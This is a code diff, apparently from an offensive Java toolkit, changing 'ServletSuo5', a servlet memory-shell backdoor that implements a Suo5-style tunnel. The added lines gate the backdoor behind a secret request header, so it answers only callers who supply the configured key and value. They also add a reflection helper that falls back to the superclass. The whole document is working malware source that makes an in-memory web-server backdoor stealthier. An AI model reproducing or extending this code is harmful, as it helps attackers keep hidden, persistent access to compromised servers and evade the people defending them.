@@ -1,5 +1,6 @@
 package com.ppp.middleware.memshell;
 
+import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.MemShellFunction;
 
@@ -21,12 +22,15 @@ import java.util.HashMap;
  */
 @MemShell(MemShell.Servlet)
 @MemShellFunction(MemShellFunction.sou5)
+@JavaClassModifiable({JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class ServletSuo5 implements InvocationHandler, Runnable, HostnameVerifier, X509TrustManager {
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
 
     InputStream gInStream;
     OutputStream gOutStream;
+    private String lockHeaderKey;
+    private String lockHeaderValue;
 
     public ServletSuo5() {
     }
@@ -50,6 +54,9 @@ public class ServletSuo5 implements InvocationHandler, Runnable, HostnameVerifie
 
     private void service(Object request, Object response) {
         try {
+            if(!((String)invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+                return;
+            }
             String agent = (String) invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{"User-Agent"});
             String contentType = (String) invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{"Content-Type"});
 
@@ -572,6 +579,14 @@ public class ServletSuo5 implements InvocationHandler, Runnable, HostnameVerifie
         return field;
     }
 
+
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        }catch (Exception e){
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
+    }
 
     public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         Method method = cls.getDeclaredMethod(methodName, argsClass);
